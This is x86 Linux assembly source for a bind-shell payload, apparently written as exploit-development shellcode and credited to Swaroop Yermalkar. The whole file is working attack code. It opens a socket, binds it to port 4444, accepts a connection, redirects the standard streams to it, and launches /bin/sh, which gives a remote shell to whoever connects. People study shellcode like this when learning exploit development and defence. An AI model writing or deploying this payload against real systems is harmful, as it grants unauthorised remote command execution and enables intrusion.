;Swaroop Yermalkar
;bind_shell

global _start
section .text
_start:

xor ebx,ebx
mul ebx

mov al,0x66 
push ebx
inc ebx
push ebx  
push byte 0x2 
mov ecx, esp 
int 0x80 

mov esi, eax 

mov al,0x66 
mov bl,2   
push edx 
push word 0x5c11 
push word bx
mov ecx, esp 
push byte 0x10
push ecx 
push esi 
mov ecx, esp 
int 0x80


mov al,0x66
mov bl,4 
push ebx 
push esi 
mov ecx,esp 
int 0x80

mov al,0x66
mov bl,5
push edx
push edx 
push esi
mov ecx, esp 
int 0x80

 
  xchg eax, ebx     
  push BYTE 0x2     
  pop ecx
dup_loop:
  mov BYTE al, 0x3F 
  int 0x80          
  dec ecx           
  jns dup_loop      


xor eax,eax

push eax

push 0x68732f6e
push 0x69622f2f

mov ebx,esp

push eax
mov ecx,esp

push ebx
mov edx,esp

mov al,11
int 0x80